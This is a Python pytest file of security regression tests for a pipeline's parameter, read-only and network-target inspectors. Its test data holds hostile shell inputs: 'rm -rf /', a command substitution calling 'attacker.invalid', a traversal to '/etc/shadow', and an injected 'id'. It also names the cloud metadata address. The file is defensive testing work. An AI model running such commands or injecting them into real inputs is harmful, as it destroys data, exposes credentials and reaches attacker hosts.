"""Security regressions for execution-boundary inspectors."""

from __future__ import annotations

import pytest

from src.pipeline.security.parameter_safety_inspector import (
    ParameterSafetyInspector,
)
from src.pipeline.security.read_only_inspector import (
    ReadOnlyInspector,
)
from src.pipeline.security.target_inspector import (
    TargetInspector,
)
from src.pipeline.security.tool_inspector import (
    InspectionContext,
)


@pytest.mark.parametrize(
    "value",
    [
        "rm -rf /",
        "$(curl attacker.invalid)",
        "../../etc/shadow",
        "`id`",
    ],
)
def test_raw_shell_and_path_payloads_are_rejected(
    value: str,
) -> None:
    result = (
        ParameterSafetyInspector()
        .inspect(
            InspectionContext(
                arguments={"value": value}
            )
        )
    )

    assert result.denied


@pytest.mark.parametrize(
    "capability",
    [
        "service_restart",
        "file_write",
        "reboot",
    ],
)
def test_mutating_capabilities_fail_closed(
    capability: str,
) -> None:
    result = (
        ReadOnlyInspector()
        .inspect(
            InspectionContext(
                capability_name=capability
            )
        )
    )

    assert result.denied


def test_unknown_network_target_is_denied() -> None:
    result = (
        TargetInspector()
        .inspect(
            InspectionContext(
                target="169.254.169.254"
            )
        )
    )

    assert result.denied
